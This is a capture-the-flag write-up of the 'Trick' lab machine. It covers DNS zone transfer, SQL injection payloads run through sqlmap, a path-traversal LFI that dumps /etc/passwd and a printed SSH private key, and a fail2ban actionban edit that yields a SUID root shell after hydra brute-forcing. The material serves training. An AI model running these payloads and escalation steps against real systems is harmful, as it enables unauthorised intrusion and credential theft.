## NMAP

```jsx
nmap -p- -sVC -v -oN nmap 10.10.11.166 
# Nmap 7.95 scan initiated Sat Jul  5 01:30:28 2025 as: /usr/lib/nmap/nmap -p- --min-rate=1000 -sVC -v -oN nmap 10.10.11.166
Nmap scan report for 10.10.11.166
Host is up (0.18s latency).
Not shown: 65531 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul  5 01:31:44 2025 -- 1 IP address (1 host up) scanned in 76.55 seconds

```

We see a smpt and a dns server on the box

### ENUMERATING DNS

LOOKING FOR SOME RECORDS USING DIG

```jsx
➜  trick dig @10.10.11.166 -x 10.10.11.166

; <<>> DiG 9.20.9-1-Debian <<>> @10.10.11.166 -x 10.10.11.166
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 23686
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: f872d5c181b4bf2efded17bd6868ef87081b59c0fd5978eb (good)
;; QUESTION SECTION:
;166.11.10.10.in-addr.arpa.     IN      PTR

;; ANSWER SECTION:
166.11.10.10.in-addr.arpa. 604800 IN    PTR     trick.htb.

;; AUTHORITY SECTION:
11.10.10.in-addr.arpa.  604800  IN      NS      trick.htb.

;; ADDITIONAL SECTION:
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1

;; Query time: 59 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (UDP)
;; WHEN: Sat Jul 05 05:48:16 EDT 2025
;; MSG SIZE  rcvd: 163
```

We got a domain name, adding this to /etc/hosts

GETTING THE ZONE TRANSFER RECORDS

```jsx
➜  trick dig @10.10.11.166 axfr trick.htb   

; <<>> DiG 9.20.9-1-Debian <<>> @10.10.11.166 axfr trick.htb
; (1 server found)
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 259 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
;; WHEN: Sat Jul 05 05:50:48 EDT 2025
;; XFR size: 6 records (messages 1, bytes 231)
```

Here we got a subdomain **preprod-payroll.trick.htb**

![image](https://github.com/user-attachments/assets/77857796-a9f0-4602-8ddb-88f792b0ff4b)


Here we see a simple login page so trying a basic auth bypass sqli payload

![image](https://github.com/user-attachments/assets/c63f5214-4936-4455-b700-bf8018c29cc4)


Copying the request to check dump database using sqlmap.

```jsx
➜  trick sqlmap -r sql.req --risk 3 --level 5 --batch                                                                                          
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.4#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:58:38 /2025-07-05/

[05:58:38] [INFO] parsing HTTP request from 'sql.req'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
[05:58:38] [INFO] resuming back-end DBMS 'mysql' 
[05:58:38] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=' OR NOT 2330=2330-- UqDX&password=as

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=' OR (SELECT 2943 FROM(SELECT COUNT(*),CONCAT(0x7171717671,(SELECT (ELT(2943=2943,1))),0x716a767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- LprK&password=as

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=' AND (SELECT 2315 FROM (SELECT(SLEEP(5)))hstC)-- NpyJ&password=as
---
[05:58:38] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[05:58:38] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb'

[*] ending @ 05:58:38 /2025-07-05/

```

AND WE GOT A TIME BASED BLIND SQLi

```jsx
[06:01:23] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[06:01:23] [INFO] fetching database users privileges
[06:01:23] [INFO] resumed: ''remo'@'localhost''
[06:01:23] [INFO] resumed: 'FILE'
database management system users privileges:
[*] 'remo'@'localhost' [1]:
    privilege: FILE
```

Since we have file privs we can read the local file

We can get more information about the website in the nginx.conf file so looking for nginx.conf file in the default location ie /etc/nginx/site-enabled/default

```jsx
sqlmap -r sql.req --risk 3 --level 5 --batch --privileges --file-read=/etc/nginx/sites-enabled/default
```

and we got the file

```jsx

server {
        listen 80;
        listen [::]:80;

        server_name preprod-marketing.trick.htb;

        root /var/www/market;
        index index.php;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
        }
}

```

if the file we see another subdomain 

preprod-marketing.trick.htb

## ENUMERATING WEBSITE

![image](https://github.com/user-attachments/assets/5705830c-4390-4279-b0f1-748a69a40e2b)


We see the site is loading the page dynamically, we can check for file read or local file inclusion

```jsx
➜  trick ffuf -u http://preprod-marketing.trick.htb/index.php\?page\=FUZZ -ic -c -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://preprod-marketing.trick.htb/index.php?page=FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42, Duration
```

```jsx
#curl http://preprod-marketing.trick.htb/index.php\?page\=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd            

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:112:121::/var/lib/saned:/usr/sbin/nologin
colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:118:65534::/run/sshd:/usr/sbin/nologin
postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin
bind:x:120:128::/var/cache/bind:/usr/sbin/nologin
michael:x:1001:1001::/home/michael:/bin/bash
```

We can look for ssh keys for the user michael in the deault location of ssh folder

```jsx
curl http://preprod-marketing.trick.htb/index.php\?page\=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//home/michael/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
```

now we can login and get the user flag

## PRIVELEGE ESCALATION

Checking if we can run any binary as root

```jsx
michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

We can google fail2ban lpe and got more information about this

### What is fail2ban

Fail2Ban is a security program that is designed to prevent brute force attacks. To do this, Fail2Ban scans log files like **/var/log/auth.log** and bans IP addresses conducting too many failed login attempts. 

### Checking for requirements

To exploit fail2ban we must a write permission over iptable config file

```jsx
michael@trick:/etc/fail2ban$ ls -al
total 76
drwxr-xr-x   6 root root      4096 Jul  5 11:48 .
drwxr-xr-x 126 root root     12288 Jul  5 07:06 ..
drwxrwx---   2 root security  4096 Jul  5 11:48 action.d
-rw-r--r--   1 root root      2334 Jul  5 11:48 fail2ban.conf
drwxr-xr-x   2 root root      4096 Jul  5 11:48 fail2ban.d
drwxr-xr-x   3 root root      4096 Jul  5 11:48 filter.d
-rw-r--r--   1 root root     22908 Jul  5 11:48 jail.conf
drwxr-xr-x   2 root root      4096 Jul  5 11:48 jail.d
-rw-r--r--   1 root root       645 Jul  5 11:48 paths-arch.conf
-rw-r--r--   1 root root      2827 Jul  5 11:48 paths-common.conf
-rw-r--r--   1 root root       573 Jul  5 11:48 paths-debian.conf
-rw-r--r--   1 root root       738 Jul  5 11:48 paths-opensuse.conf
```

Since we are in the security group we have the permisson over the action.d directory we can change the iptables-multiport.conf file with our modified file.

### Exploitation

We can set the actiobasn varibale as 

```jsx
actionban = cp /bin/bash /tmp && chmod 4755 /tmp/bash
```

Now Whenver someone tries to bruteforce any service configured with fail2ban it will execute the actionban and will result in gettin us a bash file in the tmp directory with SUID privs.

RESTART THE SERVICE

```jsx
michael@trick:/etc/fail2ban/action.d$ sudo /etc/init.d/fail2ban restart
sh: 0: getcwd() failed: No such file or directory
[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
```

BRUTEFORCING USING HYDRA

```jsx
hydra -l micheal -P /usr/share/wordlists/rockyou.txt ssh://10.10.11.166
```

AND NOW WE GOT OUR SUID BASH BINARY

```jsx
michael@trick:/tmp$ ls -al bash 
-rwsr-xr-x 1 root root 1168776 Jul  5 10:55 bash
```

```jsx
michael@trick:/tmp$ ls -al bash 
-rwsr-xr-x 1 root root 1168776 Jul  5 10:55 bash
michael@trick:/tmp$ ./bash -p 
bash-5.0# id; whoami
uid=1001(michael) gid=1001(michael) euid=0(root) groups=1001(michael),1002(security)
root
bash-5.0# 

```
